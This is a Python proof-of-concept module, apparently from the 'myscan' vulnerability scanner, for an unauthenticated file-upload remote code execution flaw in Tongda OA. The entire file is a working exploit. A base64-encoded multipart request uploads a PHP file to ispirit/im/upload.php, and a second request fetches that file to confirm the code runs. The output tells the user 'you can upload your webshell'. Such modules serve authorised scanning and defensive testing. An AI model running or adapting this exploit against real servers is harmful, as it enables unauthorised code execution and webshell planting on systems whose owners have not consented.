# !/usr/bin/env python3
# @Time    : 2020/9/2
# @Author  : caicai
# @File    : poc_tongda_oa_rce1_2020.py


'''

'''

from myscan.lib.helper.request import request
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.config import scan_set
from myscan.lib.core.common import get_random_num
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类

import base64
import re


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "tongda oa rce"
        self.vulmsg = "未授权上传rce"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 添加限定条件
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        self.parser = dictdata_parser(self.dictdata)
        random1 = get_random_num(4)
        random2 = get_random_num(4)
        payload_ = "LS0tLS0tLS0tLTE2NzM4MDEwMTgKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJVUExPQURfTU9ERSIKCjIKLS0tLS0tLS0tLTE2NzM4MDEwMTgKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJQIgoKMTIzCi0tLS0tLS0tLS0xNjczODAxMDE4CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iREVTVF9VSUQiCgoyCi0tLS0tLS0tLS0xNjczODAxMDE4CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iQVRUQUNITUVOVCI7IGZpbGVuYW1lPSJwaHAuIgpDb250ZW50LVR5cGU6IGltYWdlL2pwZWcKCjw/cGhwCmVjaG8gKE5VTTErTlVNMik7Cj8+Ci0tLS0tLS0tLS0xNjczODAxMDE4LS0K"
        payload_ = base64.b64decode(payload_.encode()).decode().replace("\n", "\r\n")
        payload_ = payload_.replace("NUM1", str(random1)).replace("NUM2", str(random2))

        req = {
            "url": self.url + "ispirit/im/upload.php",
            "method": "POST",
            "headers": {
                "Content-Type": "multipart/form-data; boundary=--------1673801018"},
            "verify": False,
            "data": payload_,
            "timeout": 10,
        }
        r = request(**req)
        if r is not None and r.content.startswith(b"+OK"):
            res = re.search(r"\+OK \[vm\]\d+@(\d+)_(\d+)\|php", r.content.decode(errors="ignore"))
            if res and len(res.groups()) == 2:
                path1, path2 = res.groups()
                path = "im/{}/{}.php".format(path1, path2)
                req1 = {
                    "url": self.url + path,
                    "method": "GET",
                    "verify": False,
                    "timeout": 10
                }

                r_ = request(**req1)
                if r_ is not None and str(random1 + random2).encode() in r_.content:
                    parser_ = response_parser(r)
                    parser1 = response_parser(r_)
                    self.result.append({
                        "name": self.name,
                        "url": self.url,
                        "level": self.level,  # 0:Low  1:Medium 2:High
                        "detail": {
                            "vulmsg": self.vulmsg,
                            "others": "you can upload your webshell",
                            "request1": parser_.getrequestraw(),
                            "response1": parser_.getresponseraw(),
                            "request2": parser1.getrequestraw(),
                            "response2": parser1.getresponseraw()
                        }
                    })
